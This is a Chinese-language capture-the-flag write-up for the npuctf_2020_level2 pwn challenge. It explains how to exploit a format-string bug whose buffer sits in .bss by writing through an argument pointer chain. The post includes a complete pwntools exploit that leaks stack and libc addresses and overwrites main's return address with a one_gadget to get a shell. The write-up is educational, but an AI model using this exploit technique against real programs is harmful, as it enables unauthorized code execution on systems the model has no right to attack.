# npuctf_2020_level2



### 总结

根据本题，学习与收获有：
- 非栈上的格式化字符串漏洞与栈上格式化字符串不同，主要区别在于无法直接使用`%XXc$XXp + addr`，去往指定地址写入内容。一般需要借助**地址链**完成任意地址写操作。
- 常用的地址链有：**rbp指针链**、**args参数链**
- 如果利用`rbp`指针链进行攻击，注意最后退出函数的时候，需要把`rbp`指针链恢复为原始状态。
- `pwntools`可以设置`context.buffer_size`，默认为`0x1000`，可以改大一点，避免`printf`参数为`%34565c%6$p`这种情况的时候，满屏的空白字符，影响下一次利用。还可以利用`for`循环结合`sleep`来确保每一次`printf`写数据的时候，把所有输出的字符都完全接收，避免得到非预期结果。
- 打远程的时候，需要利用`sleep`函数，给缓冲区刷新的时间。

<!-- more -->


### 题目分析

#### checksec

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210409212337.png)

#### 函数分析

##### main

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210409212415.png)

非常简单的`main`函数，不需要过多分析

#### 漏洞点

漏洞点就是上方函数中的`printf`格式化字符串，但是需要注意，字符串变量`buf`不在栈上，而是在`bss`段上。没有办法直接填地址去写。需要借助地址链进行分批次写入。

可以在`printf`处打下断点，看下栈：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210409214554.png)

这道题没有声明过局部栈变量，所以没有办法利用`ebp`地址链，但是可以利用`args`参数链。就在下方`0x7ffd21c29a48`

### 利用思路

#### 利用过程

详细步骤：

- 测出格式化字符串的偏移
- 在栈上寻找一下有用的信息，泄露出栈地址和`libc`地址，得到存有`main`函数结束后`eip`寄存器内容的栈地址以及`libc`基地址。
- 利用`args`参数链修改地址，指向存有`main`函数`retaddr`的栈地址。
- 循环利用`printf`把`retaddr`修改为`one_gadget`
- 输入`66666666`，结束运行`main`函数，获取`shell`

### EXP

#### 调试过程

测试格式化字符串的偏移，输入：`%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p`

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210409221556.png)

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210409221633.png)

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210409221754.png)

要泄露出栈地址，偏移为`9`，泄露出`libc`地址，偏移为`24`

然后泄露地址：

```python
sh.sendline("%9$p,%24$p")
msg = sh.recvline()
stack_addr, libc_addr = msg[:-1].split(b',')

stack_addr = int16(stack_addr.decode())
libc_addr = int16(libc_addr.decode())
LOG_ADDR('stack_addr', stack_addr)
LOG_ADDR('libc_addr', libc_addr)

stack_ret_addr = stack_addr - 0xe0
libc_base_addr = libc_addr - 0x3e7638

LOG_ADDR('stack_ret_addr', stack_ret_addr)
LOG_ADDR('libc_base_addr', libc_base_addr)

gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
one_gadget = libc_base_addr + gadgets[2]

LOG_ADDR('one_gadget', one_gadget)
```

查看输出：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210409222217.png)

然后修改栈地址链：

```python
payload = "%{}c%9$hn".format((stack_ret_addr & 0xffff))
sh.sendline(payload)
sh.recv()

payload = "%{}c%35$hn".format((one_gadget & 0xffff)) + 'a' * 0x10
sh.sendline(payload)

```

修改过程中的部分截图如下：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210409223117.png)

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210409223304.png)

最后获取到`shell`：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210409224241.png)

#### 完整exp

```python
from pwn import *
import functools

LOG_ADDR = lambda x, y: log.success('{} ===> {}'.format(x, hex(y)))
int16 = functools.partial(int, base=16)
context.update(arch='amd64', os='linux', endian='little')

sh:tube = process('./npuctf_2020_level2')

sh.sendline("%9$p,%24$p")
msg = sh.recvline()
stack_addr, libc_addr = msg[:-1].split(b',')

stack_addr = int16(stack_addr.decode())
libc_addr = int16(libc_addr.decode())
LOG_ADDR('stack_addr', stack_addr)
LOG_ADDR('libc_addr', libc_addr)

stack_ret_addr = stack_addr - 0xe0
libc_base_addr = libc_addr - 0x3e7638

LOG_ADDR('stack_ret_addr', stack_ret_addr)
LOG_ADDR('libc_base_addr', libc_base_addr)

gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
one_gadget = libc_base_addr + gadgets[0]

LOG_ADDR('one_gadget', one_gadget)
sleep(1)

payload = "%{}c%9$hn".format((stack_ret_addr & 0xffff))
sh.sendline(payload)
sh.recv()

for _ in range(2):
    sh.sendline('a' * 0x30)
    sh.recv()
    sleep(2)

payload = "%{}c%35$hn".format((one_gadget & 0xffff)) + 'a' * 0x10
sh.sendline(payload)
sh.recv()
sleep(2)


for _ in range(2):
    sh.sendline('a' * 0x30)
    sh.recv()
    sleep(2)

payload = "%{}c%9$hhn".format((stack_ret_addr & 0xff) + 2)
sh.sendline(payload)
sh.recv()
sleep(2)

for _ in range(2):
    sh.sendline('a' * 0x30)
    sh.recv()
    sleep(2)

payload = "%{}c%35$hhn".format(((one_gadget >> 16) & 0xff)) + 'a' * 0x10
sh.sendline(payload)
sh.recv()
sleep(2)

for _ in range(2):
    sh.sendline('a' * 0x30)
    sh.recv()
    sleep(2)

sh.send("6" * 8 + '\x00' * 8)

sleep(3)

sh.sendline("cat flag")

sh.interactive()
```

远程攻击效果如图：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210409220841.png)

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210409221008.png)



---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2021-04-09-npuctf-2020-level2/  

